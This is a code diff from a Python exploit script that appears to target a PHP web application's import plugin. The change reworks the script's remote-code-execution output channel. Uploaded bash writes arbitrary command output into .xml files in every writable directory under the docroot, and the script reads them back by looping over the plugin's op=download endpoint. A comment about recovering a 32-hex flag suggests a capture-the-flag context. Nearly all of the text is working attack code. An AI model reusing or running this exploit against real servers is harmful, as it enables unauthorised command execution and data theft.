@@ -172,35 +172,33 @@ KNOWN = [
 
 
 def run_cmd(o, base, mid, pid, _lhost, cmd, wait=9):
-    """Exfil via the plugin's own file list. getFileList() globs *.xml* in the
-    import dir and echoes every basename in op=list's JSON — so we ENCODE the
-    command output into a filename there and read it back from that JSON. No
-    egress, no writable-then-served docroot needed.
-
-    Output is filename-sanitised (A-Za-z0-9._=-), so a 32-hex flag comes back
-    verbatim; multi-line output is flattened. Returns the decoded string."""
+    """Exfil via the plugin's own `download` action (op=download&file_id=N). It
+    getFileList()-globs *.xml* in the SALES import dir — the exact dir our .p7m
+    extracts into — and streams the chosen file's CONTENT. So we WRITE the
+    command output (marker + output) as a .xml file there, then download by
+    index until we get the one carrying our marker. No egress, no reliance on a
+    served docroot. Returns the output after the marker."""
     marker = "SX" + os.urandom(4).hex()
-    # write the marker file into the extraction dir of our own .p7m AND every
-    # writable dir under the docroot (one of them is the dir op=list reads).
-    # base32-wrapped, so this whole script just has to be valid bash.
+    name = marker + ".xml"
     payload = "\n".join([
         f"R={DOCROOT}",
-        f'V=$( {{ {cmd} ; }} 2>/dev/null | tr "\\n" "~" | tr -cd "A-Za-z0-9._=~-" | cut -c1-120)',
         'P=$(find "$R" -name "*.p7m" 2>/dev/null | head -1)',
         'D=$(dirname "$P" 2>/dev/null)',
         'for d in "$D" $(find "$R" -type d -writable 2>/dev/null); do',
-        f'  touch "$d/{marker}${{V}}.xml" 2>/dev/null',
+        f'  {{ echo {marker}; {cmd}; }} > "$d/{name}" 2>/dev/null',
         'done',
     ])
     upload(o, base, mid, pid, payload)
     deadline = time.time() + wait
-    list_urls = [f"{base}/actions.php?op=list&id_module={mid}&id_plugin={pid}"]
     while time.time() < deadline:
-        for u in list_urls:
-            body = get(o, u) or post(o, u, b"")[1]
-            m = re.findall(marker + r"([A-Za-z0-9._=~-]*)\.xml", body)
-            if m:
-                return max(m, key=len).replace("~", "\n").strip()
+        for fid in range(0, 30):
+            u = (f"{base}/actions.php?op=download&id_module={mid}"
+                 f"&id_plugin={pid}&file_id={fid}")
+            body = get(o, u)
+            if marker in body:
+                return body.split(marker, 1)[1].strip()
+            if not body:            # index past the end of the file list
+                break
         time.sleep(0.5)
     return ""
 
@@ -275,18 +273,17 @@ def main():
             log(".", f"  {m}/{p}: HTTP {st} {resp.strip()[:100]!r}")
         sys.exit(4)
 
-    log("*", "reading output via op=list (encoding output into a filename) …")
+    log("*", "reading output via op=download (writing output to a .xml, "
+             "downloading it back by index) …")
     probe = run_cmd(o, base, mid, pid, None, "id; hostname; pwd")
     if "uid=" not in probe:
-        # verbose: show what op=list actually returns so we can pin the read path
-        log("!", "op=list didn't return our marker — dumping the read endpoints:")
-        for m, p in [(mid, pid)] + cands[:4]:
-            for meth, u in (("GET", f"{base}/actions.php?op=list&id_module={m}&id_plugin={p}"),
-                            ("GET", f"{base}/ajax_complete.php?op=list&id_module={m}&id_plugin={p}")):
-                body = get(o, u)
-                log(".", f"  {meth} op=list {m}/{p} -> {len(body)}B: {body.strip()[:160]!r}")
-        log(".", "exec is confirmed; I just need to see this JSON to lock the read. "
-                 "Paste the [.] lines above.")
+        log("!", "op=download didn't return our marker — dumping the file list so "
+                 "we can see what's in the sales import dir:")
+        for fid in range(0, 6):
+            u = (f"{base}/actions.php?op=download&id_module={mid}"
+                 f"&id_plugin={pid}&file_id={fid}")
+            body = get(o, u)
+            log(".", f"  download file_id={fid} -> {len(body)}B: {body.strip()[:120]!r}")
         sys.exit(5)
     log("+", "RCE output channel live:")
     for ln in probe.strip().splitlines():
